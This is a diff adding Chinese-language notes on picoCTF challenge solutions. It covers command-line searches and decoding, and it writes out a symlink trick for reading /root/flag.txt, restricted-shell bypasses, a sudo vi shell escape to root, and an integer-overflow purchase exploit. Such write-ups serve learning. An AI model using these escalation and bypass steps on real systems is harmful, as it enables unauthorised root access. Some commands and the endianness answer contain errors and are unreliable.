@@ -1,0 +1,116 @@
+Log Hunt:
+  	描述:在server.log文本种查找碎片单词'flag'
+    	答案: 命令: => grep -i flag server.log | cut -d: -f 4- | uniq | head -n 4 | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | tr '\n'
+      		1.使用grep 查找 'flag'
+		2.根据字符':'分割,取第4段之后的数据
+		3.进行去重
+		4.取前面4行
+		5.去除两端空白
+		6.去除换行符,进行连接
+
+endianess:
+	描述:写出字符串的小端和大端:
+	说明:大端:正向排序, 小端:反向排序
+	示例:tzopa
+	思路: 使用命令 echo -n "tzopa" | xxd -p 	#求出字符串的16进制表示
+	答案:
+		大端:正向排序 61706f7a74,  小端:反向排序747a6f7061
+
+repetitions:
+	描述:弄明白文件内容
+	说明:文件使用base64编码了多次(6次),使用linux命令解码
+	答案:命令 => cat enc_flag | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
+
+bigzip:
+	描述:在非常多的文件里查找(包含子目录)指定内容
+	答案:命令 => grep -rni	"picoCTF"
+
+FirstFind:
+	描述:在目录中查找名为"uber-secret.txt"的文件
+	答案:命令 => find ./files -name "uber-secret.txt" | xargs cat
+
+hashjobapp:
+	描述:计算字符串md5
+	答案:命令 => echo -n "xxx" | md5sum
+
+static ain't always noise:
+	描述:执行ltdis.sh static 生成文件
+	说明:ltdis.sh中代码:
+		objdump -Dj .text static > static.xxx.xx.txt	#反汇编static文件的.text 部分(section),内容输出到static.xxx.xx.txt
+		strings -a -t x $1 > $1.ltdis.strings.txt		#从二进制文件提取可打印的字符串
+
+firstgrep:
+	描述:文件中一行非常长的内容,使用grep命令找到其中的flag
+	答案:命令=> grep -oP '.{0-1}pico.{0-50} file
+
+bases:
+	描述:base64解码字符串
+	答案:命令=> echo "bDNhcm5fdGgzX3IwcDM1" | base64 -d
+
+yararules0x100:
+	描述:对可疑文件编写yara规则,使其命中(包括packed和unpacked版本)
+	思路:	
+	  1,解压文件,使用strings suspicious.exe,查看字符串,发现大量"UPX!","UPX0","UPX1"等字符串,说明文件被upx打包
+	  2,使用upx工具解包:upx -d suspicious.exe -o unpacked.exe
+	  3,因为是windos平台文件,使用: strings -el unpacked.exe	命令查看宽字符串,发现一些内容:
+	    -- "YaraRules0x100 challenge!" -- "Suspicious"(宽字符) --"picoCTF"(宽字符) --...
+ 	  4,编写yara规则,参见 yararule0x100.yar 文件
+	  5,执行命中测试;
+=====================
+##medium:
+
+don't you love banners:
+	描述:连接时服务器显示banner内容(banner文件), 要求拿到/root/flag.txt文件内容(无权限)
+	思路:banner文件有权限,flag.txt文件无权限,=> 删除banner文件,创建符号连接banner指向flag.txt
+	命令:rm banner
+		ln -s /root/flag.txt banner
+	重连,就会显示flag的内容
+
+SansAlpha:
+	描述:服务器不准输入字母甚至反斜杠,只能输入数字及其他符号,ssh连上后如何获得flag
+	思路:尝试各种命令,显示报错,根据报错的信息内容,保存报错内容,提取字符组成命令,ls,cat,然后执行
+	1.输入: "$(./1 2>&1)"
+		命令./会导致报错: bash: ./1: No such file or directory
+		2>&1 表示将错误定向到标准输出
+		"" 表示将其中内容当做参数内容保存到 $_,方便后面提取
+	2.组命令 ls : ${_:21:1}${_:2:1}
+		${_:21:1}  为 bash: ./1: No such file or directory 第21偏移的'l'字符
+		${_:2:1}  为 bash: ./1: No such file or directory 第2偏移的's'字符
+	3.当前目录,没找到,继续寻找子目录		#每次都要先执行一下 "$(./1 2>&1)"
+		${_:21:1}${_:2:1} */		# ls */ 	#遍历及子目录
+	4.找到flag.txt文件,组cat查看,拿到flag
+		${_:16:1}${_:1:1}${_:32:1} */${_:19:1}*		#cat */f*
+
+specialer:
+	描述:服务器限制了命令,如ls,cat,如何找出flag
+	思路:使用echo ,cd 命令
+	1.输入 echo *		#代替 ls 查看当前目录内容
+	2.cd xx			#cd到xx目录
+	3.输入 echo $(<xxx.txt)		#查看该目录下 xxx.txt文件得内容
+special:
+	描述:服务器会讲输入首字母大写,从而无法执行命令
+	思路:使用命令替换$()
+	1.输入 $(ls)	#会显示目录下第一个文件名(blargh)无法执行的报错信息
+	2.输入 $(ls blargh)		#有空格,报错了
+	3.输入 $(IFS=];b=ls]blargh;$b)	#绕过空格,用]代替空格	 报错信息中显示flag.txt文件名称
+	4.$(IFS=];b=cat]blargh/flag.txt;$b)	#显示flag内容
+
+Permissions
+	描述:查看根目录/root的文件 (无权限前提)
+	思路:根据 sudo -l 查看拥有的sudo权限,发现vi有,打开vi,在vi里执行shell,拿到root权限
+	1.sudo -l		#查看sudo权限,发现可以以sudo执行/usr/bin/vi
+	2.sudo /usr/bin/vi		#打开vi
+	3.命令模式执行: 
+		:!/bin/sh  进入bash命令入口:
+		执行: whoami		#看到root身份
+		执行: cd root
+		执行: ls -la 		#看到.flag.txt
+		执行: cat .falg.txt
+		
+flag_shop:
+	描述:商店有真flag,售价100000$, 假flag售价900$,手里有1100$
+	思路:通过购买假flag,当购买数量足够大,超过服务器该字段的最大数字(2^31),就会生成负数补码
+	1.计算 ((2^31 + 100000)/900)+1		#这个就是购买数量,购买后,剩余存款超过100000$
+	2.然后就可以购买真的flag
+
+
